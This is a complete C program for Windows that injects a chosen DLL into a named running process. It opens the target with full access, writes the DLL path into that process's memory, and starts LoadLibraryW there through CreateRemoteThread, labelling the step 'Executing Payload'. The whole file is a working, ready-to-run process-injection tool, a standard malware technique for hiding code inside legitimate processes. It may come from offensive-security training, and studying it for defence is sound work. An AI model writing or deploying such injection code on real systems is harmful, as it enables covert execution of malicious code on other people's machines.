#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>


BOOL InjectDllToRemoteProcess(HANDLE hProcess, LPWSTR DllName) {

	BOOL bSTATE = TRUE;

	LPVOID	pLoadLibraryW = NULL;
	LPVOID	pAddress = NULL;

	DWORD  dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);

	SIZE_T lpNumberOfBytesWritten = NULL;

	HANDLE	hThread = NULL;

	// Getting the base address of LoadLibraryW function
	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	// Allocating memory in hProcess 
	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Writing DllName to the allocated memory pAddress
	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Running LoadLibraryW in a new thread, passing pAddress as a parameter which contains the DLL name
	printf("[i] Executing Payload ... ");
	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


_EndOfFunction:
	if (hThread)
		CloseHandle(hThread);
	return bSTATE;
}

BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	HANDLE			hSnapShot = NULL;
	PROCESSENTRY32	Proc = { .dwSize = sizeof(PROCESSENTRY32) };

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {

			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		if (wcscmp(LowerName, szProcessName) == 0) {
			*dwProcessId = Proc.th32ProcessID;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

	} while (Process32Next(hSnapShot, &Proc));



_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}




int wmain(int argc, wchar_t* argv[]) {

	HANDLE	hProcess = NULL;
	DWORD	dwProcessId = NULL;

	if (argc < 3) {
		wprintf(L"[!] Usage : \"%s\" <Complete Dll Payload Path> <Process Name> \n", argv[0]);
		return -1;
	}

	if (!GetRemoteProcessHandle(argv[2], &dwProcessId, &hProcess)) {
		printf("[!] Process is Not Found \n");
		return -1;
	}

	if (!InjectDllToRemoteProcess(hProcess, argv[1])) {
		return -1;
	}


	CloseHandle(hProcess);
	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	return 0;
}

